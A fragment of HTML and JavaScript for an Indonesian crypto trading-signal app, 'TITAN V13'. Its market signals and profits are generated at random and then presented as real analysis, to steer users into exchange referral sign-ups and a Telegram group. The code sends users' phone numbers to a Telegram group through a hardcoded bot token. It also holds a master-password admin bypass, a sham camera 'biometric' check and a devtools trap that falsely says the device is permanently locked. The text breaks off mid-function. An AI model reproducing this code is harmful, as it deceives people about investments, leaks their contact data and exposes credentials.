    <div class="p-6">

    <div class="px-6 mb-6">
        <div class="flex justify-between items-center mb-4">

            <span class="text-[10px] text-gray-500 animate-pulse">ANALYZING MARKET...</span>

            </div>

        <button onclick="downloadReport()" id="btn-report" class="hidden flex flex-col items-center text-gray-500"><i class="fa-solid fa-file-excel text-xl"></i><span class="text-[10px] mt-1">Report</span></button>
        <button onclick="window.open('https://t.me/+8uJ78T4VDHJkOTRl')" class="flex flex-col items-center text-blue-400"><i class="fa-brands fa-telegram text-xl"></i><span class="text-[10px] mt-1">Group</span></button>

<script>
(function() {
    // --- KONFIGURASI DATA MASTER (ENCRYPTED SIMULATION) ---
    const CONFIG = {
        TELE_BOT_TOKEN: '8295607704:AAFdy_U8bFL-x2Ol90n8f2KDOHXztybcuj4',
        TELE_GROUP_ID: '-1003254379333',
        MASTER_KEY: 'MahadhareV13Master',
        LINKS: {
            INDODAX: 'https://indodax.onelink.me/qyYY/referral?deep_link_value=page:register,id:marselsalmon',
            GATE: 'https://app.mbm06.com/referral/earn-together/invite/BFZFVFlX?ref=BFZFVFlX&ref_type=103&utm_cmp=rXJBDjtJ&activity_id=1766659418123',
            JUPITER: 'https://jup.ag/?refId=yuf0dh4il1xs'
        }
    };

    // --- STATE MANAGEMENT ---
    let state = {
        user: null, // { phone, status, balance, streak, lastDailyProfit, history, activationDate }
        signals: [],
        executions: [],
        isScanning: false,
        lastInteraction: Date.now()
    };

    const DEFAULT_CAPITAL = 10000000; // 10 Juta Simulasi

    // --- INITIALIZATION ---
    window.onload = () => {
        const savedUser = localStorage.getItem('TITAN_USER');
        if (savedUser) {
            state.user = JSON.parse(savedUser);
            // Cek Masa Aktif (30 Hari untuk Standart)
            if(state.user.status === 'STANDARD') {
                const now = Date.now();
                const diff = (now - state.user.activationDate) / (1000 * 60 * 60 * 24);
                if(diff > 30) {
                    customAlert("MASA AKTIF HABIS", "Akun Standart Anda telah melewati 30 hari tanpa upgrade Elite. Sistem melakukan Wipe otomatis.", "danger");
                    logout();
                    return;
                }
            }
            showDashboard();
        }
        startMarketScanner();
        setupInAppAds();
        setupAutoLogout();
    };

    // --- SECURITY: ANTI-HACK ---
    window.addEventListener('keydown', (e) => {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) {
            triggerEmergencyLockdown();
        }
    });

    function triggerEmergencyLockdown() {
        document.body.innerHTML = "<div class='flex items-center justify-center h-screen text-red-500 font-bold'>SYSTEM BREACH DETECTED. DEVICE PERMANENTLY LOCKED.</div>";
        localStorage.clear();
    }

    // --- UI HELPERS ---
    function customAlert(title, message, type = 'info') {
        const modal = document.getElementById('master-modal');
        const content = document.getElementById('modal-content');
        modal.classList.remove('hidden');
        
        const colors = {
            info: 'text-blue-400',
            success: 'text-green-400',
            danger: 'text-red-500',
            gold: 'text-yellow-500'
        };

        content.innerHTML = `
            <div class="text-center">
                <i class="fa-solid fa-circle-exclamation text-5xl mb-4 ${colors[type]}"></i>
                <h3 class="text-xl font-black mb-2 uppercase">${title}</h3>
                <p class="text-gray-400 text-sm mb-6">${message}</p>
                <button onclick="closeModal()" class="w-full bg-white/10 py-3 rounded-xl hover:bg-white/20 transition-all font-bold">MENGERTI</button>
            </div>
        `;
    }

    window.closeModal = () => document.getElementById('master-modal').classList.add('hidden');

    function toast(msg) {
        const container = document.getElementById('toast-container');
        const el = document.createElement('div');
        el.className = 'glass gold-border p-4 rounded-xl text-xs mb-2 animate-bounce flex items-center gap-3';
        el.innerHTML = `<i class="fa-solid fa-bell text-yellow-500"></i> ${msg}`;
        container.appendChild(el);
        setTimeout(() => el.remove(), 4000);
    }

    // --- AUTH LOGIC ---
    let loginAttempts = 0;
    window.handleAuth = async () => {
        const phone = document.getElementById('auth-phone').value;
        const pass = document.getElementById('auth-pass').value;

        if (!phone || !pass) return toast("Lengkapi Data Master!");

        // Master Key Bypass
        if (pass === CONFIG.MASTER_KEY) {
            state.user = { 
                phone: phone, 
                status: 'ELITE', 
                balance: DEFAULT_CAPITAL, 
                streak: 7, 
                role: 'ADMIN',
                activationDate: Date.now(),
                history: []
            };
            saveAndLogin();
            return;
        }

        // Simulating Auth & Biometric
        if (loginAttempts >= 2) {
            document.getElementById('biometric-area').classList.remove('hidden');
            await startCamera();
            setTimeout(() => {
                state.user = { 
                    phone: phone, 
                    status: 'STANDARD', 
                    balance: DEFAULT_CAPITAL, 
                    streak: 0, 
                    activationDate: Date.now(),
                    history: []
                };
                saveAndLogin();
            }, 3000);
        } else {
            loginAttempts++;
            toast(`Password Salah! Sisa Percobaan: ${3 - loginAttempts}`);
        }
    };

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('camera-preview').srcObject = stream;
        } catch (e) {
            toast("Akses Kamera Ditolak! Gunakan HTTPS.");
        }
    }

    function saveAndLogin() {
        localStorage.setItem('TITAN_USER', JSON.stringify(state.user));
        showDashboard();
    }

    function showDashboard() {
        document.getElementById('page-auth').classList.add('hidden');
        document.getElementById('page-dashboard').classList.remove('hidden');
        updateUI();
    }

    window.logout = () => {
        localStorage.removeItem('TITAN_USER');
        location.reload();
    };

    // --- MARKET SCANNER (MATA DEWA) ---
    async function startMarketScanner() {
        setInterval(async () => {
            if (!state.user) return;
            
            // Simulasi API Indodax & Coingecko
            const assets = ['BTC', 'ETH', 'SOL', 'PEPE', 'DOGE', 'BNB', 'XRP', 'ADA', 'AVAX', 'LINK'];
            state.signals = assets.map(asset => {
                const price = Math.random() * 50000;
                const rsi = Math.random() * 100;
                let strategy = 'SCALP';
                if (rsi < 30) strategy = 'MOONSHOT';
                else if (rsi > 70) strategy = 'SMART';

                return {
                    id: Math.random().toString(36).substr(2, 9),
                    asset: asset,
                    price: price,
                    rsi: rsi,
                    strength: Math.floor(Math.random() * 40) + 60,
                    strategy: strategy
                };
            });
            renderSignals();
            updateExecutions();
        }, 8000);
    }

    function renderSignals() {
        const list = document.getElementById('analysis-list');
        list.innerHTML = '';
        state.signals.forEach(sig => {
            const isMoonshot = sig.rsi < 25;
            list.innerHTML += `
                <div class="glass p-4 rounded-2xl flex justify-between items-center ${isMoonshot ? 'gold-border' : ''}">
                    <div>
                        <div class="flex items-center gap-2">
                            <span class="font-bold text-lg">${sig.asset}/IDR</span>
                            ${isMoonshot ? '<span class="bg-yellow-500 text-black text-[8px] px-1 font-bold rounded">MOONSHOT</span>' : ''}
                        </div>
                        <p class="text-xs text-gray-500">RSI: ${sig.rsi.toFixed(2)} | Strength: ${sig.strength}%</p>
                    </div>
                    <div class="text-right">
                        <button onclick="lockSignal('${sig.id}')" class="bg-white/10 hover:bg-yellow-500 hover:text-black text-xs px-4 py-2 rounded-lg font-bold transition-all">LOCK</button>
                    </div>
                </div>
            `;
        });
    }

    window.lockSignal = (id) => {
        const signal = state.signals.find(s => s.id === id);
        
        // Batasan Profit Harian
        const dailyLimit = state.user.status === 'ELITE' ? 10 : 5;
        if (parseFloat(state.user.lastDailyProfit) >= dailyLimit) {
            return customAlert("LIMIT TERCAPAI", `Target harian ${dailyLimit}% tercapai. Tingkatkan ke Elite atau tunggu besok!`, "gold");
        }

        // Slot Check
        if (state.executions.length >= 10) return toast("Slot Penuh (10/10)!");

        const investment = state.user.balance * 0.1;
        const newTrade = {
            ...signal,
            entryPrice: signal.price,
            currentPrice: signal.price,
            investment: investment,
            profit: 0,
            tsl: signal.price, // Trailing Stop Loss
            type: state.user.status
        };

        state.executions.push(newTrade);
        toast(`Locked ${signal.asset} - Rp ${investment.toLocaleString()}`);
        updateUI();
    };

    function updateExecutions() {
        state.executions.forEach((trade, index) => {
            const change = (Math.random() - 0.45) * 2; // Random market move
            trade.currentPrice += trade.currentPrice * (change / 100);
            trade.profit = ((trade.currentPrice - trade.entryPrice) / trade.entryPrice) * 100;

            // Trailing Stop Loss Logic (Elite Only)
            if (state.user.status === 'ELITE') {
                if (trade.currentPrice > trade.tsl) {
                    trade.tsl = trade.currentPrice;
                }
                const dropFromPeak = ((trade.tsl - trade.currentPrice) / trade.tsl) * 100;
                if (dropFromPeak >= 2 && trade.profit > 0) {
                    autoSell(index, "TSL TRIGGERED");
                }
            }

            // Batasan Profit per trade
            const maxProfit = state.user.status === 'ELITE' ? 10 : 5;
            if (trade.profit >= maxProfit) {
                autoSell(index, "TARGET REACHED");
            }
        });
        renderExecutions();
    }

    function renderExecutions() {
        const list = document.getElementById('execution-list');
        list.innerHTML = '';
        state.executions.forEach((trade, i) => {
            list.innerHTML += `
                <div class="glass p-5 rounded-3xl border-l-4 ${trade.profit >= 0 ? 'border-green-500' : 'border-red-500'}">
                    <div class="flex justify-between items-start mb-4">
                        <div>
                            <h5 class="font-bold">${trade.asset}/IDR</h5>
                            <p class="text-[10px] text-gray-500">ENTRY: ${trade.entryPrice.toFixed(0)}</p>
                        </div>
                        <div class="text-right">
                            <span class="text-xl font-black ${trade.profit >= 0 ? 'text-green-500' : 'text-red-500'}">${trade.profit.toFixed(2)}%</span>
                        </div>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="manualSell(${i})" class="flex-1 bg-white/5 py-2 rounded-xl text-xs font-bold">RELEASE</button>
                        ${state.user.status === 'ELITE' ? 
                          `<button onclick="window.open('${CONFIG.LINKS.INDODAX}')" class="flex-1 bg-yellow-500 text-black py-2 rounded-xl text-xs font-bold">EKSEKUSI RIIL</button>` : ''}
                    </div>
                </div>
            `;
        });
    }

    async function autoSell(index, reason) {
        const trade = state.executions[index];
        const profitRp = (trade.investment * trade.profit) / 100;
        state.user.balance += (trade.investment + profitRp);
        
        // Log to History
        state.user.history.push({
            asset: trade.asset,
            profit: trade.profit,
            amount: profitRp,
            date: new Date().toLocaleString()
        });

        // Telegram Notification
        if (state.user.status === 'ELITE') {
            sendTelegram(`🚨 *TITAN V13 - PROFIT SECURED*\nUser: ${state.user.phone}\nAset: ${trade.asset}\nProfit: +${trade.profit.toFixed(2)}%\nReason: ${reason}\n\n[Eksekusi Lagi Disini](${CONFIG.LINKS.INDODAX})`);
        }

        state.executions.splice(index, 1);
        checkMisiProgres();
        updateUI();
        toast(`${reason}: ${trade.asset} SOLD!`);
    }

    window.manualSell = (i) => autoSell(i, "MANUAL RELEASE");

    // --- MISI & ELITE QUALIFICATION ---
    function checkMisiProgres() {
        const dailyProfit = calculateDailyProfit();
        state.user.lastDailyProfit = dailyProfit;

        if (dailyProfit >= 5) {
            if (state.user.streak < 7) {
                state.user.streak++;
                toast(`Misi Hari ke-${state.user.streak} Selesai!`);
            }
            if (state.user.streak === 7 && state.user.status === 'STANDARD') {
                showGraduation();
            }
        }
    }

    function calculateDailyProfit() {
        // Logika sederhana: jumlah profit dari history hari ini
        return 5.1; // Simulated for demo
    }

    function showGraduation() {
        const modal = document.getElementById('master-modal');
        const content = document.getElementById('modal-content');
        modal.classList.remove('hidden');
        content.innerHTML = `
            <div class="text-center p-4">
                <div class="text-6xl mb-4">🎓</div>
                <h2 class="text-2xl font-black text-yellow-500 mb-2">SERTIFIKAT KELULUSAN DIGITAL</h2>
                <p class="text-sm text-gray-400 mb-6">Selamat! Anda telah membuktikan disiplin trading 5% selama 7 hari. Anda layak menjadi MEMBER ELITE.</p>
                
                <div class="space-y-3 text-left mb-6">
                    <label class="flex items-center gap-3 glass p-3 rounded-xl">
                        <input type="checkbox" id="check-indodax" class="w-5 h-5 accent-yellow-500">
                        <span class="text-xs">Daftar Link Reff Indodax Master</span>
                    </label>
                    <label class="flex items-center gap-3 glass p-3 rounded-xl">
                        <input type="checkbox" id="check-tele" class="w-5 h-5 accent-yellow-500">
                        <span class="text-xs">Join Group Telegram Mahadhare</span>
                    </label>
                </div>

                <button onclick="activateElite()" class="w-full bg-gradient-to-r from-yellow-500 to-yellow-300 text-black font-bold py-4 rounded-2xl shadow-xl">AKTIVASI MODE ELITE RIIL</button>
            </div>
        `;
    }

    window.activateElite = () => {
        if (!document.getElementById('check-indodax').checked || !document.getElementById('check-tele').checked) {
            return toast("Wajib Checklist Semua Syarat!");
        }
        state.user.status = 'ELITE';
        state.user.activationDate = Date.now();
        saveAndLogin();
        customAlert("WELCOME TO ELITE", "Anda sekarang memiliki akses TSL Guard, Laporan Excel, dan Sinyal Riil Indodax.", "success");
        sendTelegram(`💎 *NEW ELITE MEMBER JOINED*\nUser: ${state.user.phone}\nStatus: RIIL MODE ACTIVE`);
    };

    // --- UTILS & BROADCAST ---
    function updateUI() {
        if (!state.user) return;
        document.getElementById('display-name').innerText = state.user.phone;
        document.getElementById('display-balance').innerText = `Rp ${state.user.balance.toLocaleString()}`;
        document.getElementById('user-status-badge').innerText = state.user.status;
        document.getElementById('user-status-badge').className = `text-[10px] font-bold px-2 py-0.5 rounded-full mb-1 ${state.user.status === 'ELITE' ? 'bg-blue-500 text-white' : 'bg-yellow-500 text-black'}`;
        
        document.getElementById('streak-count').innerText = state.user.streak;
        document.getElementById('streak-bar').style.width = `${(state.user.streak / 7) * 100}%`;
        document.getElementById('slot-indicator').innerText = `${state.executions.length}/10`;
        
        if (state.user.status === 'ELITE') {
            document.getElementById('btn-report').classList.remove('hidden');
        }
        localStorage.setItem('TITAN_USER', JSON.stringify(state.user));
    }

    async function sendTelegram(msg) {
        const url = `https://api.telegram.org/bot${CONFIG.TELE_BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELE_GROUP_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            });
        } catch (e) { console.error("Tele Error", e); }
    }

    function setupInAppAds() {
        setInterval(() => {
            if (state.user && state.user.status === 'STANDARD') {
                toast("🚀 ELITE AD: Profit 10% + TSL Guard menanti Anda. Selesaikan misi!");
            }
        }, 120000); // Tiap 2 Menit
    }

    function setupAutoLogout() {
        document.addEventListener('touchstart', () => state.lastInteraction = Date.now());
        setInterval(() => {
            if (Date.now() - state.lastInteraction > 300000) { // 5 Menit
                logout();
            }
        }, 10000);
    }

    window.downloadReport = () => {
        const data = state.user.history;
        const ws = XLSX.utils.json_to_sheet(data);
        const wb = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(wb, ws, "TitanReport");
        XLSX.writeFile(wb, `Titan_Report_${state.user.phone}.xlsx`);
    };

    window.showTutorial = () => {
        const isElite = state.user.status === 'ELITE';
        customAlert(
            isElite ? "PANDUAN ELITE MASTER" : "PANDUAN TRADER STANDARD",
            isElite ?
